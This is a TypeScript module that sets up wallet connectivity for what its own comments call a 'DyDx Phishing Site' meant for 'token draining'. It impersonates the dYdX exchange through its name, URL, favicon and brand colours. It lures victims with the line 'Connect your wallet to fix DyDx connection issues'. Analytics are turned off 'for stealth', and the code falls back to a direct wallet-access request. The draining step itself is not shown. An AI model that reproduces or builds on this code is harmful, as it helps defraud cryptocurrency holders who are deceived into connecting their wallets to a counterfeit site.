/**
 * Reown AppKit Configuration for DyDx Phishing Site
 * 
 * Multi-wallet support using Reown AppKit (formerly WalletConnect)
 * for comprehensive wallet connectivity and token draining.
 */

import { createAppKit } from '@reown/appkit'
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5'
import { mainnet } from '@reown/appkit/networks'

// Project configuration with fallback
const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID || process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'dd830d985907b8065908432e4742bd54'

console.log('🔧 Reown Project ID:', projectId)

// Metadata for the DyDx phishing site
const metadata = {
  name: 'DyDx Wallet Connection',
  description: 'Connect your wallet to fix DyDx connection issues',
  url: typeof window !== 'undefined' ? window.location.origin : 'https://dydx.exchange',
  icons: ['https://dydx.exchange/favicon.ico']
}

// Create the Ethers adapter
const ethersAdapter = new Ethers5Adapter()

// Suppress Lit development warnings and optimize performance
if (typeof window !== 'undefined') {
  // Set Lit to production mode to suppress warnings
  ;(window as any).litDevMode = false
  
  // Override console.warn to filter out Lit warnings
  const originalWarn = console.warn
  console.warn = (...args) => {
    const message = args.join(' ')
    if (message.includes('scheduled an update') || 
        message.includes('change-in-update') ||
        message.includes('Lit is in dev mode') ||
        message.includes('reactive-element')) {
      return // Suppress these warnings
    }
    originalWarn.apply(console, args)
  }
}

// Initialize Reown AppKit with error handling
let appKit: any = null

try {
  appKit = createAppKit({
    adapters: [ethersAdapter],
    networks: [mainnet],
    metadata,
    projectId,
    features: {
      analytics: false, // Disable analytics for stealth
      email: false,     // Disable email login
      socials: [],      // No social logins
      onramp: false,    // Disable fiat onramp
      swaps: false,     // Disable swaps
      history: false    // Disable transaction history
    },
    themeMode: 'dark',
    themeVariables: {
      // Customize colors to match DyDx branding
      '--w3m-color-mix': '#7370ff',
      '--w3m-color-mix-strength': 40,
      '--w3m-accent': '#7370ff',
      '--w3m-border-radius-master': '12px',
      // Use system fonts to avoid CORS issues
      '--w3m-font-family': '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
      '--w3m-font-size-master': '14px'
    } as any
  })
  console.log('✅ Reown AppKit initialized successfully')
} catch (error) {
  console.warn('⚠️ Reown AppKit initialization warning:', error)
  // Continue with limited functionality
}

export { appKit }

// Reown Wallet Manager for DyDx phishing
export class ReownWalletManager {
  private modal: any = null
  private isConnectedState: boolean = false
  private accountState: string | undefined = undefined
  private chainIdState: number | undefined = undefined

  constructor() {
    this.modal = appKit
    if (this.modal) {
      this.initializeListeners()
      console.log('✅ Reown wallet manager initialized')
    } else {
      console.log('⚠️ Reown unavailable, using fallback wallet connection')
    }
  }

  private initializeListeners() {
    if (!this.modal) return
    
    let accountChangeTimeout: NodeJS.Timeout | null = null
    
    // Listen for account changes with debouncing
    this.modal.subscribeAccount?.((account: any) => {
      if (accountChangeTimeout) {
        clearTimeout(accountChangeTimeout)
      }
      
      accountChangeTimeout = setTimeout(() => {
        const newAddress = account?.address
        const newConnected = account?.isConnected || false
        
        // Only log if there's an actual change
        if (newAddress !== this.accountState || newConnected !== this.isConnectedState) {
          this.accountState = newAddress
          this.isConnectedState = newConnected
          if (newAddress) {
            console.log('🔗 Account connected:', newAddress)
          } else if (this.accountState) {
            console.log('🔌 Account disconnected')
          }
        }
      }, 100) // 100ms debounce
    })

    // Listen for network changes
    this.modal.subscribeChainId?.((chainId: number) => {
      if (chainId !== this.chainIdState) {
        this.chainIdState = chainId
        console.log('🌐 Network changed:', chainId)
      }
    })
  }

  async connect(): Promise<string> {
    try {
      console.log('🔗 Attempting Reown connection...')
      
      // Check if appKit is available
      if (!appKit) {
        console.log('⚠️ Reown unavailable, trying direct wallet connection...')
        return this.connectDirect()
      }
      
      await this.modal.open()
      
      // Wait for connection
      return new Promise((resolve, reject) => {
        const checkConnection = () => {
          if (this.isConnectedState && this.accountState) {
            resolve(this.accountState)
          } else {
            setTimeout(checkConnection, 100)
          }
        }
        
        setTimeout(() => {
          if (!this.isConnectedState) {
            console.log('⚠️ Reown timeout, trying direct connection...')
            this.connectDirect().then(resolve).catch(reject)
          }
        }, 15000) // 15 second timeout, then fallback
        
        checkConnection()
      })
    } catch (error) {
      console.error('❌ Reown connection failed, trying direct connection:', error)
      return this.connectDirect()
    }
  }

  // Direct wallet connection fallback
  private async connectDirect(): Promise<string> {
    try {
      console.log('🔗 Attempting direct wallet connection...')
      
      if (!window.ethereum) {
        throw new Error('No wallet detected. Please install MetaMask or another Web3 wallet.')
      }

      const accounts = await (window as any).ethereum.request({
        method: 'eth_requestAccounts'
      })

      if (accounts && accounts.length > 0) {
        this.accountState = accounts[0]
        this.isConnectedState = true
        console.log('✅ Direct wallet connection successful:', accounts[0])
        return accounts[0]
      }

      throw new Error('No accounts returned from wallet')
    } catch (error) {
      console.error('❌ Direct wallet connection failed:', error)
      throw error
    }
  }

  disconnect(): void {
    try {
      this.modal?.disconnect?.()
      this.isConnectedState = false
      this.accountState = undefined
      this.chainIdState = undefined
    } catch (error) {
      console.error('Disconnect failed:', error)
    }
  }

  getAccount(): string | undefined {
    return this.accountState || this.modal?.getAccount?.()?.address
  }

  getChainId(): number | undefined {
    if (this.chainIdState) {
      return this.chainIdState
    }
    
    try {
      return this.modal?.getChainId?.() || this.modal?.state?.chainId
    } catch (error) {
      console.warn('Failed to get chain ID:', error)
      return undefined
    }
  }

  isConnected(): boolean {
    return this.isConnectedState || this.modal?.getAccount?.()?.isConnected || false
  }

  async getProvider(): Promise<any> {
    try {
      // Try Reown provider first
      if (appKit && this.modal) {
        const provider = await this.modal.getWalletProvider?.()
        if (provider) {
          return provider
        }
      }
      
      // Fallback to window.ethereum
      if (window.ethereum) {
        console.log('🔄 Using direct window.ethereum provider')
        return window.ethereum
      }
      
      throw new Error('No provider available')
    } catch (error) {
      console.warn('⚠️ Provider access failed, using fallback:', error)
      
      // Last resort: return window.ethereum if available
      if (window.ethereum) {
        return window.ethereum
      }
      
      return null
    }
  }

  subscribeToAccount(callback: (account: string | undefined) => void): () => void {
    return this.modal.subscribeAccount?.((account: any) => {
      this.accountState = account?.address
      this.isConnectedState = account?.isConnected || false
      callback(this.accountState)
    }) || (() => {})
  }

  subscribeToNetwork(callback: (chainId: number | undefined) => void): () => void {
    return this.modal.subscribeChainId?.((chainId: number) => {
      this.chainIdState = chainId
      callback(chainId)
    }) || (() => {})
  }
}

// Export singleton instance
export const reownWalletManager = new ReownWalletManager()

// Supported wallets for the DyDx phishing site
export const SUPPORTED_WALLETS = [
  'MetaMask',
  'Trust Wallet',
  'Coinbase Wallet',
  'Rainbow',
  'Phantom',
  'Brave Wallet',
  'WalletConnect',
  'Ledger',
  'Trezor'
]
